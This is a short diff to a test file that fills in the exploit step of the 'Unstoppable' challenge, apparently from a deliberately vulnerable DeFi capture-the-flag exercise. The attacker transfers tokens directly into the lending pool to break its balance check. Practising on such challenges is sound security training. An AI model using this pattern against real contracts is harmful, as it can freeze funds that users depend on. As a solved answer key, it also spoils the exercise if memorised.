@@ -39,7 +39,8 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const attackTokenContract = this.token.connect(attacker) // we connect the attacker account with token contract 
+        await attackTokenContract.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
     });
 
     after(async function () {
